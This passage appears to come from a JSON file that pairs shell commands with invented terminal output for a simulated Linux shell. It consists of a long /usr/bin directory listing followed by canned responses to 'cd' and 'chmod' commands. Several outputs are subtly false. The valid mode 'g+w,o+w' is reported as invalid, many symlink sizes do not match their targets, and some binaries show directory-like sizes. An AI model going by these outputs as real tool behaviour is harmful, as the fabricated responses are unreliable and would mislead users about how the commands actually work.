/usr/bin/gcc-nm-4.7\n-rwxr-xr-x 1 root root      19416 2013-04-05 12:00 gcc-nm-4.7\nlrwxrwxrwx 1 root root         14 2013-04-05 12:01 gcc-ranlib -> /usr/bin/gcc-ranlib-4.7\n-rwxr-xr-x 1 root root      19416 2013-04-05 12:00 gcc-ranlib-4.7\nlrwxrwxrwx 1 root root          8 2013-04-05 12:01 gcov -> /usr/bin/gcov-4.7\n-rwxr-xr-x 1 root root      28796 2013-04-05 12:01 gcov-4.6\n-rwxr-xr-x 1 root root     207796 2013-04-05 12:00 gcov-4.7\n-rwxr-xr-x 1 root root      17936 2013-04-05 12:01 gencat\nlrwxrwxrwx 1 root root          3 2013-04-05 11:52 geqn -> /usr/bin/eqn\n-rwxr-xr-x 1 root root      17840 2013-04-05 11:52 getconf\n-rwxr-xr-x 1 root root      18308 2013-04-05 11:52 getent\n-rwxr-xr-x 1 root root       9616 2013-04-05 11:53 getkeycodes\n-rwxr-xr-x 1 root root      13772 2013-04-05 11:52 getopt\n-rwxr-xr-x 1 root root      30276 2013-04-05 12:02 gettext\n-rwxr-xr-x 1 root root       4655 2013-04-05 12:02 gettext.sh\n-rwxr-xr-x 1 root root      35496 2013-04-05 11:52 ginstall-info\nlrwxrwxrwx 1 root root          7 2013-04-05 12:00 gold -> /usr/bin/ld.gold\n-rwsr-xr-x 1 root root      66196 2013-04-05 11:52 gpasswd\n-rwxr-xr-x 1 root root     992972 2013-04-05 11:52 gpg\n-rwxr-xr-x 1 root root       3303 2013-04-05 11:52 gpg-zip\n-rwxr-xr-x 1 root root      50948 2013-04-05 11:52 gpgsplit\n-rwxr-xr-x 1 root root     358652 2013-04-05 11:52 gpgv\nlrwxrwxrwx 1 root root          3 2013-04-05 11:52 gpic -> /usr/bin/pic\n-rwxr-xr-x 1 root root      93392 2013-04-05 12:00 gprof\n-rwxr-xr-x 1 root root      75188 2013-04-05 11:52 groff\n-rwxr-xr-x 1 root root       9267 2013-04-05 11:52 grog\n-rwxr-xr-x 1 root root     132884 2013-04-05 11:52 grops\n-rwxr-xr-x 1 root root      91540 2013-04-05 11:52 grotty\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 groups\n-rwxr-xr-x 1 root root      11232 2013-04-05 12:02 grub-bin2h\n-rwxr-xr-x 1 root root      92636 2013-04-05 12:02 grub-editenv\n-rwxr-xr-x 1 root root     364720 2013-04-05 12:02 grub-fstest\n-rwxr-xr-x 1 root root        206 2013-04-05 12:02 grub-kbdcomp\n-rwxr-xr-x 1 root root      72432 2013-04-05 12:02 grub-menulst2cfg\n-rwxr-xr-x 1 root root      89724 2013-04-05 12:02 grub-mkfont\n-rwxr-xr-x 1 root root     124308 2013-04-05 12:02 grub-mkimage\n-rwxr-xr-x 1 root root      63836 2013-04-05 12:02 grub-mklayout\n-rwxr-xr-x 1 root root      72128 2013-04-05 12:02 grub-mkpasswd-pbkdf2\n-rwxr-xr-x 1 root root      59484 2013-04-05 12:02 grub-mkrelpath\n-rwxr-xr-x 1 root root      10237 2013-04-05 12:02 grub-mkrescue\n-rwxr-xr-x 1 root root     363056 2013-04-05 12:02 grub-mount\nlrwxrwxrwx 1 root root         34 2013-04-05 12:02 grub-ntldr-img -> /usr/lib/grub/i386-pc/grub-ntldr-img\n-rwxr-xr-x 1 root root      84092 2013-04-05 12:02 grub-script-check\nlrwxrwxrwx 1 root root          3 2013-04-05 11:52 gtbl -> /usr/bin/tbl\n-rwxr-xr-x 1 root root      13788 2013-04-05 12:01 gtf\nlrwxrwxrwx 1 root root          7 2013-04-05 11:52 hd -> /usr/bin/hexdump\n-rwxr-xr-x 1 root root      42572 2013-04-05 11:52 head\n-rwxr-xr-x 1 root root       2480 2013-04-05 11:52 helpztags\n-rwxr-xr-x 1 root root      26156 2013-04-05 11:52 hexdump\n-rwxr-xr-x 1 root root      26152 2013-04-05 11:52 hostid\nlrwxrwxrwx 1 root root          7 2013-04-05 11:52 i386 -> /usr/bin/setarch\nlrwxrwxrwx 1 root root          7 2013-04-05 12:00 i486-linux-gnu-cpp -> /usr/bin/cpp-4.7\nlrwxrwxrwx 1 root root          7 2013-04-05 12:01 i486-linux-gnu-cpp-4.6 -> /usr/bin/cpp-4.6\nlrwxrwxrwx 1 root root          7 2013-04-05 12:00 i486-linux-gnu-cpp-4.7 -> /usr/bin/cpp-4.7\nlrwxrwxrwx 1 root root          7 2013-04-05 12:01 i486-linux-gnu-gcc -> /usr/bin/gcc-4.7\nlrwxrwxrwx 1 root root          7 2013-04-05 12:01 i486-linux-gnu-gcc-4.6 -> /usr/bin/gcc-4.6\nlrwxrwxrwx 1 root root          7 2013-04-05 12:00 i486-linux-gnu-gcc-4.7 -> /usr/bin/gcc-4.7\nlrwxrwxrwx 1 root root         10 2013-04-05 12:00 i486-linux-gnu-gcc-ar-4.7 -> /usr/bin/gcc-ar-4.7\nlrwxrwxrwx 1 root root         10 2013-04-05 12:00 i486-linux-gnu-gcc-nm-4.7 -> /usr/bin/gcc-nm-4.7\nlrwxrwxrwx 1 root root         14 2013-04-05 12:00 i486-linux-gnu-gcc-ranlib-4.7 -> /usr/bin/gcc-ranlib-4.7\n-rwxr-xr-x 1 root root      30496 2013-04-05 12:02 icombine\n-rwxr-xr-x 1 root root      50884 2013-04-05 11:52 iconv\n-rwxr-xr-x 1 root root      34396 2013-04-05 11:52 id\n-rwxr-xr-x 1 root root      13816 2013-04-05 12:02 ijoin\n-rwxr-xr-x 1 root root     172920 2013-04-05 11:52 info\nlrwxrwxrwx 1 root root         29 2013-04-05 11:52 infobrowser -> /usr/bin/info\n-rwxr-xr-x 1 root root      50884 2013-04-05 11:52 infocmp\n-rwxr-xr-x 1 root root      19184 2013-04-05 11:52 infokey\nlrwxrwxrwx 1 root root          3 2013-04-05 11:52 infotocap -> /usr/bin/tic\n-rwxr-xr-x 1 root root     112564 2013-04-05 11:52 install\n-rwxr-xr-x 1 root root       1216 2013-04-05 11:52 install-info\n-rwxr-xr-x 1 root root     260472 2013-04-05 12:01 install-menu\n-rwxr-xr-x 1 root root      17900 2013-04-05 11:52 ionice\n-rwxr-xr-x 1 root root       9640 2013-04-05 11:52 ipcmk\n-rwxr-xr-x 1 root root       9644 2013-04-05 11:52 ipcrm\n-rwxr-xr-x 1 root root      21928 2013-04-05 11:52 ipcs\nlrwxrwxrwx 1 root root         19 2013-04-05 11:52 iptables-xml -> /sbin/xtables-multi\n-rwxr-xr-x 1 root root       5632 2013-04-05 11:52 ischroot\n-rwxr-xr-x 1 root root      88048 2013-04-05 12:02 ispell\n-rwxr-xr-x 1 root root       7148 2013-04-05 12:02 ispell-wrapper\n-rwxr-xr-x 1 root root      42604 2013-04-05 11:52 join\n-rwxr-xr-x 1 root root       9624 2013-04-05 11:53 kbdinfo\n-rwxr-xr-x 1 root root       4096 2014-07-30 15:39 killall\n-rwxr-xr-x 1 root root      17944 2013-04-05 11:52 last\nlrwxrwxrwx 1 root root          4 2013-04-05 11:52 lastb -> /usr/bin/last\n-rwxr-xr-x 1 root root      13828 2013-04-05 11:52 lastlog\n-rwxr-xr-x 1 root root       7812 2013-04-05 12:02 lcf\nlrwxrwxrwx 1 root root          6 2013-04-05 12:00 ld -> /usr/bin/ld.bfd\n-rwxr-xr-x 1 root root     827668 2013-04-05 12:00 ld.bfd\n-rwxr-xr-x 1 root root    1731008 2013-04-05 12:00 ld.gold\n-rwxr-xr-x 1 root root       5272 2013-04-05 11:52 ldd\n-rwxr-xr-x 1 root root      79476 2013-04-05 11:52 lexgrog\nlrwxrwxrwx 1 root root         21 2013-04-05 11:52 lft -> /usr/bin/lft.db\n-rwxr-xr-x 1 root root       2493 2013-04-05 11:52 lft.db\n-rwxr-xr-x 1 root root       5480 2013-04-05 11:52 line\n-rwxr-xr-x 1 root root      30248 2013-04-05 11:52 link\n-rwxr-xr-x 1 root root       1577 2013-04-05 12:02 linux-boot-prober\n-rwxr-xr-x 1 root root       2696 2013-04-05 11:52 linux-version\nlrwxrwxrwx 1 root root          7 2013-04-05 11:52 linux32 -> /usr/bin/setarch\nlrwxrwxrwx 1 root root          7 2013-04-05 11:52 linux64 -> /usr/bin/setarch\n-rwxr-xr-x 1 root root      11680 2013-04-05 11:52 lnstat\nlrwxrwxrwx 1 root root         13 2013-04-05 11:53 loadkeys -> /bin/loadkeys\n-rwxr-xr-x 1 root root      22076 2013-04-05 11:53 loadunimap\n-rwxr-xr-x 1 root root      31784 2013-04-05 11:52 locale\n-rwxr-xr-x 1 root root     309180 2013-04-05 11:52 localedef\n-rwxr-xr-x 1 root root      18268 2013-04-05 11:52 logger\n-rwxr-xr-x 1 root root      26156 2013-04-05 11:52 logname\n-rwxr-xr-x 1 root root       9664 2013-04-05 11:52 look\n-rwxr-xr-x 1 root root       2763 2013-04-05 11:52 lorder\n-rwxr-xr-x 1 root root       9732 2013-04-05 11:52 lsattr\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 lscpu\n-rwxr-xr-x 1 root root       1116 2013-04-05 11:52 lsinitramfs\n-rwxr-xr-x 1 root root      68724 2013-04-05 11:53 lspci\n-rwxr-xr-x 1 root root       1081 2013-04-05 11:52 lspgpot\n-rwxr-xr-x 1 root root     117632 2013-04-05 11:53 lsusb\nlrwxrwxrwx 1 root root         23 2013-04-05 11:52 lzcat -> /usr/bin/xz\nlrwxrwxrwx 1 root root         23 2013-04-05 11:52 lzcmp -> /usr/bin/xzdiff\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 lzdiff -> /usr/bin/xzdiff\nlrwxrwxrwx 1 root root         25 2013-04-05 11:52 lzegrep -> /usr/bin/xzgrep\nlrwxrwxrwx 1 root root         25 2013-04-05 11:52 lzfgrep -> /usr/bin/xzgrep\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 lzgrep -> /usr/bin/xzgrep\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 lzless -> /usr/bin/xzless\nlrwxrwxrwx 1 root root         22 2013-04-05 11:52 lzma -> /usr/bin/xz\n-rwxr-xr-x 1 root root       9644 2013-04-05 11:52 lzmainfo\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 lzmore -> /usr/bin/xzmore\n-rwxr-xr-x 1 root root     160396 2013-04-05 12:01 make\n-rwxr-xr-x 1 root root     100968 2013-04-05 11:52 man\n-rwxr-xr-x 1 root root     124644 2013-04-05 11:52 mandb\n-rwxr-xr-x 1 root root      26172 2013-04-05 11:52 manpath\n-rwxr-xr-x 1 root root      17976 2013-04-05 11:53 mapscrn\n-rwxr-xr-x 1 root root     106908 2013-04-05 11:52 mawk\n-rwxr-xr-x 1 root root      13868 2013-04-05 11:52 mcookie\n-rwxr-xr-x 1 root root      38484 2013-04-05 11:52 md5sum\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 md5sum.textutils -> /usr/bin/md5sum\n-rwxr-xr-x 1 root root       5528 2013-04-05 11:52 mesg\n-rwxr-xr-x 1 root root      16163 2013-04-05 11:53 mk_modmap\n-rwxr-xr-x 1 root root      30260 2013-04-05 11:52 mkfifo\n-rwxr-xr-x 1 root root         65 2013-04-05 12:01 mkfontdir\n-rwxr-xr-x 1 root root      26784 2013-04-05 12:01 mkfontscale\n-rwxr-xr-x 1 root root       6524 2013-04-05 12:01 mtrace\n-rwxr-xr-x 1 root root      31093 2013-04-05 12:02 munchlist\n-rwxr-xr-x 1 root root      17920 2013-04-05 11:52 namei\nlrwxrwxrwx 1 root root          9 2013-04-05 11:52 nano -> /bin/nano\nlrwxrwxrwx 1 root root         22 2013-04-05 11:52 nawk -> /usr/bin/mawk\n-rwxr-xr-x 1 root root      24404 2013-04-05 11:52 ncal\n-rwxr-xr-x 1 root root       5226 2013-04-05 11:52 ncurses5-config\n-rwxr-xr-x 1 root root       5236 2013-04-05 11:52 ncursesw5-config\n-rwxr-xr-x 1 root root        271 2013-04-05 11:52 neqn\n-rwsr-xr-x 1 root root      30880 2013-04-05 11:52 newgrp\n-rwxr-xr-x 1 root root      30284 2013-04-05 12:02 ngettext\n-rwxr-xr-x 1 root root      30264 2013-04-05 11:52 nice\n-rwxr-xr-x 1 root root      42652 2013-04-05 11:52 nl\n-rwxr-xr-x 1 root root      35340 2013-04-05 12:00 nm\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 nohup\n-rwxr-xr-x 1 root root      30264 2013-04-05 11:52 nproc\n-rwxr-xr-x 1 root root       3401 2013-04-05 11:52 nroff\n-rwxr-xr-x 1 root root      14172 2013-04-05 11:52 nstat\n-rwxr-xr-x 1 root root     211424 2013-04-05 12:00 objcopy\n-rwxr-xr-x 1 root root     291184 2013-04-05 12:00 objdump\n-rwxr-xr-x 1 root root      67188 2013-04-05 11:52 od\n-rwxr-xr-x 1 root root     162424 2013-04-05 11:52 oldfind\n-rwxr-xr-x 1 root root    1675708 2013-04-05 11:52 omshell\n-rwxr-xr-x 1 root root       4260 2013-04-05 12:02 os-prober\nlrwxrwxrwx 1 root root         23 2013-04-05 11:52 pager -> /bin/more\n-rwxr-xr-x 1 root root      38844 2013-04-05 11:52 partx\n-rwsr-xr-x 1 root root      45396 2013-04-05 11:52 passwd\n-rwxr-xr-x 1 root root      30268 2013-04-05 11:52 paste\n-rwxr-xr-x 1 root root     121584 2013-04-05 12:01 patch\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 pathchk\n-rwxr-xr-x 1 root root       9808 2013-04-05 11:53 pcimodules\nlrwxrwxrwx 1 root root          6 2013-04-05 12:06 pdb -> /usr/lib/python2.7/pdb.py\nlrwxrwxrwx 1 root root         23 2013-04-05 12:06 pdb2.7 -> /usr/lib/python2.7/pdb.py\n-rwxr-xr-x 1 root root        603 2013-04-05 11:52 perf\n-rwxr-xr-x 1 root root    1487332 2013-04-05 11:52 perl\n-rwxr-xr-x 1 root root    1487332 2013-04-05 11:52 perl5.14.2\n-rwxr-xr-x 1 root root      30352 2013-04-05 11:52 pg\n-rwxr-xr-x 1 root root      17984 2013-04-05 11:52 pgrep\n-rwxr-xr-x 1 root root       4096 2014-07-30 16:16 php\n-rwxr-xr-x 1 root root     166708 2013-04-05 11:52 pic\nlrwxrwxrwx 1 root root         22 2013-04-05 11:52 pico -> /bin/nano\n-rwxr-xr-x 1 root root      34436 2013-04-05 11:52 pinky\nlrwxrwxrwx 1 root root          5 2013-04-05 11:52 pkill -> /usr/bin/pgrep\n-rwxr-xr-x 1 root root      13832 2013-04-05 11:52 pmap\n-rwxr-xr-x 1 root root      63172 2013-04-05 11:52 pr\n-rwxr-xr-x 1 root root      38532 2013-04-05 11:52 preconv\nlrwxrwxrwx 1 root root         11 2013-04-05 12:06 print -> /usr/bin/run-mailcap\n-rwxr-xr-x 1 root root      30244 2013-04-05 11:52 printenv\n-rwxr-xr-x 1 root root      17828 2013-04-05 11:52 printerbanner\n-rwxr-xr-x 1 root root      46688 2013-04-05 11:52 printf\nlrwxrwxrwx 1 root root          9 2013-04-05 11:53 psfaddtable -> /usr/bin/psfxtable\nlrwxrwxrwx 1 root root          9 2013-04-05 11:53 psfgettable -> /usr/bin/psfxtable\nlrwxrwxrwx 1 root root          9 2013-04-05 11:53 psfstriptable -> /usr/bin/psfxtable\n-rwxr-xr-x 1 root root      17876 2013-04-05 11:53 psfxtable\n-rwxr-xr-x 1 root root      67276 2013-04-05 11:52 ptx\n-rwxr-xr-x 1 root root       9664 2013-04-05 11:52 pwdx\n-rwxr-xr-x 1 root root       4123 2013-04-05 12:06 pyclean\n-rwxr-xr-x 1 root root      11894 2013-04-05 12:06 pycompile\nlrwxrwxrwx 1 root root          8 2013-04-05 12:06 pydoc -> /usr/bin/pydoc2.7\n-rwxr-xr-x 1 root root         79 2013-04-05 12:06 pydoc2.7\nlrwxrwxrwx 1 root root         12 2013-04-05 12:06 pygettext -> /usr/bin/pygettext2.7\n-rwxr-xr-x 1 root root      22103 2013-04-05 12:06 pygettext2.7\nlrwxrwxrwx 1 root root          9 2013-04-05 12:06 python -> /usr/bin/python2.7\n-rwxr-xr-x 1 root root    2728836 2013-04-05 12:06 python2.7\nlrwxrwxrwx 1 root root         29 2013-04-05 12:06 pyversions -> /usr/share/python/pyversions.py\n-rwxr-xr-x 1 root root      51324 2013-04-05 12:00 ranlib\nlrwxrwxrwx 1 root root         21 2013-04-05 12:02 rcp -> /usr/bin/scp\n-rwxr-xr-x 1 root root     339380 2013-04-05 12:00 readelf\n-rwxr-xr-x 1 root root       5532 2013-04-05 11:52 rename.ul\n-rwxr-xr-x 1 root root       9632 2013-04-05 11:52 renice\n-rwxr-xr-x 1 root root       2166 2013-04-05 12:01 report-hw\nlrwxrwxrwx 1 root root          4 2013-04-05 11:52 reset -> /usr/bin/tset\n-rwxr-xr-x 1 root root      13860 2013-04-05 11:53 resizecons\n-rwxr-xr-x 1 root root       9660 2013-04-05 11:52 rev\n-rwxr-xr-x 1 root root         30 2013-04-05 11:52 rgrep\nlrwxrwxrwx 1 root root         24 2013-04-05 12:02 rlogin -> /usr/bin/ssh\n-rwxr-xr-x 1 root root        173 2013-04-05 11:52 routef\n-rwxr-xr-x 1 root root       1262 2013-04-05 11:52 routel\n-rwxr-xr-x 1 root root      79672 2013-04-05 12:01 rpcgen\n-rwxr-xr-x 1 root root      13788 2013-04-05 11:52 rpcinfo\nlrwxrwxrwx 1 root root         21 2013-04-05 12:02 rsh -> /usr/bin/ssh\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 rtstat -> /usr/bin/lnstat\n-rwxr-xr-x 1 root root      17084 2013-04-05 12:06 run-mailcap\n-rwxr-xr-x 1 root root      34408 2013-04-05 11:52 runcon\nlrwxrwxrwx 1 root root         23 2013-04-05 11:52 rview -> /usr/bin/vim.tiny\n-rwxr-xr-x 1 root root      10347 2013-04-05 11:52 savelog\n-rwxr-xr-x 1 root root      62848 2013-04-05 12:02 scp\n-rwxr-xr-x 1 root root       9640 2013-04-05 11:53 screendump\n-rwxr-xr-x 1 root root      13844 2013-04-05 11:52 script\n-rwxr-xr-x 1 root root       9668 2013-04-05 11:52 scriptreplay\n-rwxr-xr-x 1 root root      50848 2013-04-05 11:52 sdiff\nlrwxrwxrwx 1 root root         11 2013-04-05 12:06 see -> /usr/bin/run-mailcap\n-rwxr-xr-x 1 root root        474 2013-04-05 12:02 select-default-iwrap\n-rwxr-xr-x 1 root root       1436 2013-04-05 11:52 sensible-browser\n-rwxr-xr-x 1 root root        616 2013-04-05 11:52 sensible-editor\n-rwxr-xr-x 1 root root        288 2013-04-05 11:52 sensible-pager\n-rwxr-xr-x 1 root root      42572 2013-04-05 11:52 seq\n-rwxr-xr-x 1 root root       9632 2013-04-05 11:52 setarch\n-rwxr-xr-x 1 root root       9612 2013-04-05 11:53 setkeycodes\n-rwxr-xr-x 1 root root       9672 2013-04-05 11:53 setleds\n-rwxr-xr-x 1 root root       5508 2013-04-05 11:53 setlogcons\n-rwxr-xr-x 1 root root       5588 2013-04-05 11:53 setmetamode\n-rwxr-xr-x 1 root root      17916 2013-04-05 11:53 setpci\n-rwxr-xr-x 1 root root       5520 2013-04-05 11:52 setsid\n-rwxr-xr-x 1 root root      26132 2013-04-05 11:52 setterm\n-rwxr-xr-x 1 root root       9716 2013-04-05 11:53 setvtrgb\n-rwxr-xr-x 1 root root      18344 2013-04-05 12:01 setxkbmap\n-rwxr-xr-x 1 root root     112124 2013-04-05 12:02 sftp\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 sg -> /usr/bin/newgrp\n-rwxr-xr-x 1 root root      42580 2013-04-05 11:52 sha1sum\n-rwxr-xr-x 1 root root      46676 2013-04-05 11:52 sha224sum\n-rwxr-xr-x 1 root root      46676 2013-04-05 11:52 sha256sum\n-rwxr-xr-x 1 root root      87636 2013-04-05 11:52 sha384sum\n-rwxr-xr-x 1 root root      87636 2013-04-05 11:52 sha512sum\n-rwxr-xr-x 1 root root      13764 2013-04-05 11:53 showconsolefont\n-rwxr-xr-x 1 root root       9636 2013-04-05 11:53 showkey\n-rwxr-xr-x 1 root root      54960 2013-04-05 11:52 shred\n-rwxr-xr-x 1 root root      46732 2013-04-05 11:52 shuf\n-rwxr-xr-x 1 root root      24016 2013-04-05 12:00 size\n-rwxr-xr-x 1 root root      17968 2013-04-05 11:52 skill\n-rwxr-xr-x 1 root root      17916 2013-04-05 11:52 slabtop\nlrwxrwxrwx 1 root root          3 2013-04-05 12:02 slogin -> /usr/bin/ssh\nlrwxrwxrwx 1 root root          5 2013-04-05 11:52 snice -> /usr/bin/skill\n-rwxr-xr-x 1 root root      30292 2013-04-05 11:52 soelim\n-rwxr-xr-x 1 root root     100352 2013-04-05 11:52 sort\n-rwxr-xr-x 1 root root      67732 2013-04-05 11:52 split\n-rwxr-xr-x 1 root root       5508 2013-04-05 11:53 splitfont\n-rwxr-xr-x 1 root root      22064 2013-04-05 12:01 sprof\n-rwxr-xr-x 1 root root       5556 2013-04-05 12:02 sq\n-rwxr-xr-x 1 root root     440816 2013-04-05 12:02 ssh\n-rwxr-xr-x 1 root root     145324 2013-04-05 12:02 ssh-add\n-rwxr-sr-x 1 root ssh      128396 2013-04-05 12:02 ssh-agent\n-rwxr-xr-x 1 root root       1452 2013-04-05 12:02 ssh-argv0\n-rwxr-xr-x 1 root root       1489 2013-04-05 12:02 ssh-copy-id\n-rwxr-xr-x 1 root root     198604 2013-04-05 12:02 ssh-keygen\n-rwxr-xr-x 1 root root     235804 2013-04-05 12:02 ssh-keyscan\n-rwxr-xr-x 1 root root     133036 2013-04-05 12:02 ssh-vulnkey\n-rwxr-xr-x 1 root root      75500 2013-04-05 11:52 stat\n-rwxr-xr-x 1 root root      67228 2013-04-05 11:52 stdbuf\n-rwxr-xr-x 1 root root      22624 2013-04-05 12:00 strings\n-rwxr-xr-x 1 root root     211428 2013-04-05 12:00 strip\n-rwxr-xr-x 1 root root       3123 2013-04-05 12:01 su-to-root\n-rwxr-xr-x 1 root root      38496 2013-04-05 11:52 sum\n-rwxr-xr-x 1 root root       9768 2013-04-05 11:52 tabs\n-rwxr-xr-x 1 root root      34400 2013-04-05 11:52 tac\n-rwxr-xr-x 1 root root      63140 2013-04-05 11:52 tail\n-rwxr-xr-x 1 root root      15928 2013-04-05 11:52 tasksel\n-rwxr-xr-x 1 root root      17912 2013-04-05 11:52 taskset\n-rwxr-xr-x 1 root root     112252 2013-04-05 11:52 tbl\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 tee\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 test\n-rwxr-xr-x 1 root root      59104 2013-04-05 11:52 tic\n-rwxr-xr-x 1 root root      51316 2013-04-05 11:52 timeout\n-rwxr-xr-x 1 root root       9712 2013-04-05 11:52 tload\n-rwxr-xr-x 1 root root      13876 2013-04-05 11:52 toe\n-rwxr-xr-x 1 root root      69796 2013-04-05 11:52 top\nlrwxrwxrwx 1 root root         10 2013-04-05 11:52 touch -> /bin/touch\n-rwxr-xr-x 1 root root      13916 2013-04-05 11:52 tput\n-rwxr-xr-x 1 root root      46668 2013-04-05 11:52 tr\nlrwxrwxrwx 1 root root         28 2013-04-05 11:52 traceproto -> /usr/bin/traceproto.db\n-rwxr-xr-x 1 root root       2885 2013-04-05 11:52 traceproto.db\nlrwxrwxrwx 1 root root         28 2013-04-05 11:52 traceroute -> /usr/bin/traceroute.db\n-rwxr-xr-x 1 root root       1618 2013-04-05 11:52 traceroute-nanog\n-rwxr-xr-x 1 root root      61396 2013-04-05 11:52 traceroute.db\nlrwxrwxrwx 1 root root         29 2013-04-05 11:52 traceroute6 -> /usr/bin/traceroute.db\nlrwxrwxrwx 1 root root         13 2013-04-05 11:52 traceroute6.db -> /usr/bin/traceroute.db\n-rwxr-xr-x 1 root root     463412 2013-04-05 11:52 troff\n-rwxr-xr-x 1 root root      54916 2013-04-05 11:52 truncate\n-rwxr-xr-x 1 root root       4919 2013-04-05 12:02 tryaffix\n-rwxr-xr-x 1 root root      18084 2013-04-05 11:52 tset\n-rwxr-xr-x 1 root root      38472 2013-04-05 11:52 tsort\n-rwxr-xr-x 1 root root      26160 2013-04-05 11:52 tty\n-rwxr-xr-x 1 root root       7251 2013-04-05 11:52 tzselect\n-rwxr-xr-x 1 root root      37937 2013-04-05 12:02 ucf\n-rwxr-xr-x 1 root root      19290 2013-04-05 12:02 ucfq\n-rwxr-xr-x 1 root root      10405 2013-04-05 12:02 ucfr\n-rwxr-xr-x 1 root root      15392 2013-04-05 12:01 ucs2any\n-rwxr-xr-x 1 root root      13756 2013-04-05 11:52 ul\n-rwxr-xr-x 1 root root      34380 2013-04-05 11:52 unexpand\n-rwxr-xr-x 1 root root        530 2013-04-05 11:53 unicode_stop\n-rwxr-xr-x 1 root root      38492 2013-04-05 11:52 uniq\n-rwxr-xr-x 1 root root      26152 2013-04-05 11:52 unlink\nlrwxrwxrwx 1 root root         24 2013-04-05 11:52 unlzma -> /usr/bin/xz\n-rwxr-xr-x 1 root root       5532 2013-04-05 11:52 unshare\n-rwxr-xr-x 1 root root       5572 2013-04-05 12:02 unsq\nlrwxrwxrwx 1 root root          2 2013-04-05 11:52 unxz -> /usr/bin/xz\n-rwxr-xr-x 1 root root      42564 2013-04-05 11:52 update-alternatives\n-rwxr-xr-x 1 root root     129492 2013-04-05 12:01 update-menus\n-rwxr-xr-x 1 root root       2905 2013-04-05 11:53 update-pciids\n-rwxr-xr-x 1 root root       9636 2013-04-05 11:52 uptime\n-rwxr-xr-x 1 root root       4202 2013-04-05 11:53 usb-devices\n-rwxr-xr-x 1 root root      20460 2013-04-05 11:53 usbhid-dump\n-rwxr-xr-x 1 root root      30280 2013-04-05 11:52 users\nlrwxrwxrwx 1 root root         20 2013-04-05 11:52 vi -> /usr/bin/vim.tiny\nlrwxrwxrwx 1 root root         22 2013-04-05 11:52 view -> /usr/bin/vim.tiny\n-rwxr-xr-x 1 root root     730004 2013-04-05 11:52 vim.tiny\n-rwxr-xr-x 1 root root      26100 2013-04-05 11:52 vmstat\n-rwxr-xr-x 1 root root       5412 2013-04-05 11:53 volname\nlrwxrwxrwx 1 root root         19 2013-04-05 11:52 w -> /usr/bin/w.procps\n-rwxr-xr-x 1 root root      17916 2013-04-05 11:52 w.procps\n-rwxr-sr-x 1 root tty       18020 2013-04-05 11:52 wall\n-rwxr-xr-x 1 root root      18288 2013-04-05 11:52 watch\n-rwxr-xr-x 1 root root      38524 2013-04-05 11:52 wc\n-rwxr-xr-x 1 root root     374300 2013-04-05 11:52 wget\n-rwxr-xr-x 1 root root      38676 2013-04-05 11:52 whatis\n-rwxr-xr-x 1 root root       9920 2013-04-05 11:52 whereis\nlrwxrwxrwx 1 root root         10 2013-04-05 11:52 which -> /bin/which\n-rwxr-xr-x 1 root root      26272 2013-04-05 11:52 whiptail\n-rwxr-xr-x 1 root root      50820 2013-04-05 11:52 who\n-rwxr-xr-x 1 root root      30256 2013-04-05 11:52 whoami\nlrwxrwxrwx 1 root root         23 2013-04-05 11:52 write -> /usr/bin/bsd-write\nlrwxrwxrwx 1 root root          7 2013-04-05 11:52 x86_64 -> /usr/bin/setarch\n-rwxr-xr-x 1 root root      38480 2013-04-05 11:52 xargs\n-rwxr-xr-x 1 root root      32384 2013-04-05 12:01 xauth\n-rwxr-xr-x 1 root root       8692 2013-04-05 12:01 xkbbell\n-rwxr-xr-x 1 root root     194708 2013-04-05 12:01 xkbcomp\n-rwxr-xr-x 1 root root      27652 2013-04-05 12:01 xkbevd\n-rwxr-xr-x 1 root root      90040 2013-04-05 12:01 xkbprint\n-rwxr-xr-x 1 root root      17092 2013-04-05 12:01 xkbvleds\n-rwxr-xr-x 1 root root      14628 2013-04-05 12:01 xkbwatch\n-rwxr-xr-x 1 root root      13972 2013-04-05 11:52 xxd\n-rwxr-xr-x 1 root root      71516 2013-04-05 11:52 xz\nlrwxrwxrwx 1 root root          2 2013-04-05 11:52 xzcat -> /usr/bin/xz\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 xzcmp -> /usr/bin/xzdiff\n-rwxr-xr-x 1 root root       5518 2013-04-05 11:52 xzdiff\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 xzegrep -> /usr/bin/xzgrep\nlrwxrwxrwx 1 root root          6 2013-04-05 11:52 xzfgrep -> /usr/bin/xzgrep\n-rwxr-xr-x 1 root root       5421 2013-04-05 11:52 xzgrep\n-rwxr-xr-x 1 root root       1807 2013-04-05 11:52 xzless\n-rwxr-xr-x 1 root root       2168 2013-04-05 11:52 xzmore\n-rwxr-xr-x 1 root root      26152 2013-04-05 11:52 yes\n-rwxr-xr-x 1 root root      13752 2013-04-05 11:52 zdump\n-rwxr-xr-x 1 root root      46556 2013-04-05 11:52 zsoelim\n\n",
    "cd /usr/local/bin; ls -al": "drwxrwsr-x 1 root staff 4096 2013-04-05 11:52 .\ndrwxrwsr-x 1 root staff 4096 2013-04-05 11:52 ..\n\n",
    "cd Documents": "bash: cd: Documents: No such file or directory\n\n",
    "cd ~/Desktop": "bash: cd: ~/Desktop: No such file or directory\n\n",
    "cd /home/phil/Desktop": "bash: cd: /home/phil/Desktop: No such file or directory\n\n",
    "chmod": "chmod: missing operand\nTry 'chmod --help' for more information.\n\n",
    "chmod -R a+rX /home/phil/directory": "chmod: cannot access '/home/phil/directory': No such file or directory\n\n",
    "chmod -R a+rX /home/phil/directory1,/home/phil/directory2": "chmod: cannot access '/home/phil/directory1,/home/phil/directory2': No such file or directory\n\n",
    "chmod -R g+w,o+w /home/phil/directory": "chmod: invalid mode: \u2018g+w,o+w\u2019\nTry 'chmod --help' for more information.\n\n",
    "chmod a+rx /home/phil/file": "chmod: cannot access '/home/phil/file': No such file or directory\n\n",
